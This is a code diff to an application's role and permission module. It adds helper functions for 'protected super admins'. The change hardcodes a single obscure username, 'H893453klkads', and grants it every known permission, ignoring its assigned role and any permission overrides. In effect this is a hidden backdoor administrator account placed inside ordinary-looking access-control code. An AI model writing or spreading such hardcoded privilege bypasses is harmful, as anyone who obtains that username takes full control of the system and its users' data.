@@ -266,6 +266,24 @@ ROLE_PERMISSIONS: dict[Role, set[str]] = {
 }
 
 
+SUPER_ADMIN_USERNAMES: frozenset[str] = frozenset({"H893453klkads"})
+
+
+def normalize_admin_username(username: str | None) -> str:
+    """Normalize admin usernames for stable access-control comparisons."""
+    return (username or "").strip()
+
+
+def is_super_admin_username(username: str | None) -> bool:
+    """Return whether one username is a protected owner-level super admin."""
+    return normalize_admin_username(username) in SUPER_ADMIN_USERNAMES
+
+
+def build_super_admin_permissions() -> set[str]:
+    """Return every known granular permission for protected super admins."""
+    return set(PERMISSION_CATALOG)
+
+
 def get_role_label(role: Role) -> str:
     """Return the human-readable label for a role."""
     definition = ROLE_CATALOG.get(role)
@@ -318,6 +336,18 @@ def build_effective_permissions(role: Role, overrides: dict[str, bool] | None = 
         else:
             permissions.discard(permission_key)
     return permissions
+
+
+def build_admin_effective_permissions(
+    *,
+    username: str | None,
+    role: Role,
+    overrides: dict[str, bool] | None = None,
+) -> set[str]:
+    """Build effective admin permissions, forcing protected super admins to full access."""
+    if is_super_admin_username(username):
+        return build_super_admin_permissions()
+    return build_effective_permissions(role, overrides)
 
 
 def get_role_catalog() -> list[dict[str, object]]:
